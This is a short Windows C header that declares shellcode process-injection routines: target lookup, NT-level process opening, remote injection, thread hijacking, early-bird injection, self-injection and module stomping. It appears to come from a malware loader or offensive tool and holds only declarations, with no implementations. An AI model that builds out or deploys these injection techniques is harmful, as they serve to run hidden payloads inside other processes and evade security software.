#pragma once
#include <windows.h>

DWORD inject_find_target(void);
HANDLE inject_nt_open_process(DWORD pid, DWORD access);
int inject_remote(DWORD pid, const BYTE *sc, SIZE_T sc_len);
int inject_thread_hijack(DWORD pid, const BYTE *sc, SIZE_T sc_len);
int inject_earlybird(const BYTE *sc, SIZE_T sc_len);
int inject_self(const BYTE *sc, SIZE_T sc_len);
int inject_stomp(DWORD pid, const BYTE *sc, SIZE_T sc_len, const char *dll_path);
